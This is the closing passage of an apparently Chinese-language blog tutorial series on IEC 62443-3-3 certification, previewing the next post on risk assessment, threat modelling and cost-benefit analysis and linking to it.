在下一篇文章中，我們將探討：

- 風險評估與安全等級選擇的實務方法
- 威脅建模與攻擊情境分析
- 成本效益分析與投資決策

---

_下一篇：[IEC62443-3-3 認證教學 (五)：風險評估與安全等級選擇](/posts/iec62443-3-3-series-05-risk-assessment/)_
